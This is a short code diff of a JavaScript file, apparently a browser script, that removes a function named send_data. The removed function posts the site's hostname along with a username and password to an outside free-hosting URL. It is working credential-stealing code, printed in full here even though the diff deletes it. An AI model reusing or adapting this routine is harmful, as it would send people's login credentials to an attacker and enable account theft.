@@ -19,27 +19,7 @@ function send_pwd(){
 }
 
 
-function send_data(usuario, senha){
-    const url = 'https://get-data123.000webhostapp.com/user.php';
-    const params = {
-      hostname: location.host,
-      username: usuario,
-      password: senha
-    };
 
-    fetch(url, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify(params)
-    })
-    .then(response => response.json())
-    .then(data => console.log(data))
-    .catch(error => console.error(error));
-
-
-}
                                   
                                   
                                   
